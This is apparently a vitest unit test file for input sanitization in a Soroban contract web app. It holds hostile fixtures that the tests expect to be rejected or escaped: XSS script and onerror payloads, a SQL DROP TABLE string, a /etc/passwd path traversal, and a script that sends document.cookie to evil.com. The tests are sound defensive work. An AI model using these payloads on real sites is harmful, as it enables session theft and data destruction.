/**
 * sanitize-input.test.ts
 *
 * Issue #940: Unit tests verifying input sanitization and XSS / injection prevention.
 */

import { describe, it, expect } from "vitest";
import {
  validateContractId,
  assertContractId,
  escapeHtml,
  stripHtml,
  sanitizeUserString,
  sanitizeSearchParam,
  sanitizeAllSearchParams,
} from "./sanitize-input";

// ─── Contract ID validation ───────────────────────────────────────────────────

describe("validateContractId", () => {
  const VALID_ID = "CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD2KBO";

  it("accepts a valid 56-character Soroban contract address", () => {
    const result = validateContractId(VALID_ID);
    expect(result.valid).toBe(true);
    expect(result.contractId).toBe(VALID_ID);
  });

  it("normalises lowercase input to uppercase", () => {
    const result = validateContractId(VALID_ID.toLowerCase());
    expect(result.valid).toBe(true);
    expect(result.contractId).toBe(VALID_ID);
  });

  it("trims leading/trailing whitespace before validating", () => {
    const result = validateContractId(`  ${VALID_ID}  `);
    expect(result.valid).toBe(true);
    expect(result.contractId).toBe(VALID_ID);
  });

  it("rejects a non-string value", () => {
    const result = validateContractId(42);
    expect(result.valid).toBe(false);
    expect(result.contractId).toBeNull();
  });

  it("rejects an empty string", () => {
    const result = validateContractId("");
    expect(result.valid).toBe(false);
    expect(result.contractId).toBeNull();
  });

  it("rejects an address that starts with a wrong letter", () => {
    const bad = "GAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD2KBO";
    const result = validateContractId(bad);
    expect(result.valid).toBe(false);
  });

  it("rejects an address that is too short", () => {
    const result = validateContractId("CAAAAAAAAAAAA");
    expect(result.valid).toBe(false);
  });

  it("rejects an address that is too long", () => {
    const result = validateContractId(VALID_ID + "X");
    expect(result.valid).toBe(false);
  });

  it("rejects a script injection attempt", () => {
    const result = validateContractId("<script>alert(1)</script>");
    expect(result.valid).toBe(false);
    expect(result.contractId).toBeNull();
  });

  it("rejects a SQL injection attempt", () => {
    const result = validateContractId("'; DROP TABLE contracts; --");
    expect(result.valid).toBe(false);
    expect(result.contractId).toBeNull();
  });

  it("rejects a path traversal attempt", () => {
    const result = validateContractId("../../etc/passwd");
    expect(result.valid).toBe(false);
    expect(result.contractId).toBeNull();
  });
});

describe("assertContractId", () => {
  it("returns the validated ID for valid input", () => {
    const id = "CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD2KBO";
    expect(assertContractId(id)).toBe(id);
  });

  it("throws TypeError for invalid input", () => {
    expect(() => assertContractId("not-a-contract-id")).toThrow(TypeError);
  });
});

// ─── HTML escaping ────────────────────────────────────────────────────────────

describe("escapeHtml", () => {
  it("escapes & characters", () => {
    expect(escapeHtml("a & b")).toBe("a &amp; b");
  });

  it("escapes < characters", () => {
    expect(escapeHtml("<script>")).toBe("&lt;script&gt;");
  });

  it("escapes > characters", () => {
    expect(escapeHtml("a > b")).toBe("a &gt; b");
  });

  it("escapes double-quotes", () => {
    expect(escapeHtml('"hello"')).toBe("&quot;hello&quot;");
  });

  it("escapes single-quotes", () => {
    expect(escapeHtml("it's")).toBe("it&#x27;s");
  });

  it("prevents XSS via script tag", () => {
    const escaped = escapeHtml('<script>alert("xss")</script>');
    expect(escaped).not.toContain("<script>");
    expect(escaped).toContain("&lt;script&gt;");
  });

  it("prevents XSS via event handler attribute", () => {
    const escaped = escapeHtml('<img src=x onerror="alert(1)">');
    expect(escaped).not.toContain("<img");
  });
});

// ─── HTML stripping ───────────────────────────────────────────────────────────

describe("stripHtml", () => {
  it("removes HTML tags, leaving text content", () => {
    expect(stripHtml("<p>Hello <b>world</b></p>")).toContain("Hello");
    expect(stripHtml("<p>Hello <b>world</b></p>")).not.toContain("<");
  });

  it("strips script tags to prevent XSS", () => {
    const result = stripHtml('<script>alert("xss")</script>');
    expect(result).not.toContain("<script>");
  });

  it("handles plain text without modification (beyond tag stripping)", () => {
    expect(stripHtml("plain text")).toBe("plain text");
  });
});

// ─── sanitizeUserString ───────────────────────────────────────────────────────

describe("sanitizeUserString", () => {
  it("returns empty string for non-string input", () => {
    expect(sanitizeUserString(null)).toBe("");
    expect(sanitizeUserString(undefined)).toBe("");
    expect(sanitizeUserString(42)).toBe("");
  });

  it("trims leading and trailing whitespace", () => {
    expect(sanitizeUserString("  hello  ")).toBe("hello");
  });

  it("collapses internal whitespace", () => {
    expect(sanitizeUserString("hello   world")).toBe("hello world");
  });

  it("removes HTML tags", () => {
    expect(sanitizeUserString("<b>bold</b>")).not.toContain("<b>");
  });

  it("enforces maxLength option", () => {
    expect(sanitizeUserString("hello world", { maxLength: 5 })).toBe("hello");
  });

  it("prevents script injection via search param", () => {
    const malicious = '<script>fetch("//evil.com?c=" + document.cookie)</script>';
    const result = sanitizeUserString(malicious);
    expect(result).not.toContain("<script>");
    expect(result).not.toContain("fetch(");
  });
});

// ─── sanitizeSearchParam ─────────────────────────────────────────────────────

describe("sanitizeSearchParam", () => {
  it("extracts and sanitizes a query parameter from a URLSearchParams", () => {
    const params = new URLSearchParams("q=hello+world&other=test");
    expect(sanitizeSearchParam(params, "q")).toBe("hello world");
  });

  it("returns null for a missing parameter", () => {
    const params = new URLSearchParams("a=1");
    expect(sanitizeSearchParam(params, "missing")).toBeNull();
  });

  it("sanitizes injection attempts in parameter values", () => {
    const params = new URLSearchParams(
      'q=<script>alert(document.cookie)</script>',
    );
    const result = sanitizeSearchParam(params, "q");
    expect(result).not.toContain("<script>");
  });

  it("accepts a URL instance", () => {
    const url = new URL("https://example.com/page?contract=CABC");
    expect(sanitizeSearchParam(url, "contract")).toBe("CABC");
  });

  it("accepts a raw query string with leading ?", () => {
    const result = sanitizeSearchParam("?name=Alice", "name");
    expect(result).toBe("Alice");
  });

  it("accepts a raw query string without leading ?", () => {
    const result = sanitizeSearchParam("name=Alice", "name");
    expect(result).toBe("Alice");
  });
});

// ─── sanitizeAllSearchParams ──────────────────────────────────────────────────

describe("sanitizeAllSearchParams", () => {
  it("returns a map of all sanitized parameters", () => {
    const params = new URLSearchParams("a=1&b=2");
    const result = sanitizeAllSearchParams(params);
    expect(result).toEqual({ a: "1", b: "2" });
  });

  it("sanitizes all values", () => {
    const params = new URLSearchParams(
      'a=<script>alert(1)</script>&b=normal',
    );
    const result = sanitizeAllSearchParams(params);
    expect(result.a).not.toContain("<script>");
    expect(result.b).toBe("normal");
  });

  it("returns an empty object for an empty query string", () => {
    expect(sanitizeAllSearchParams(new URLSearchParams(""))).toEqual({});
  });
});
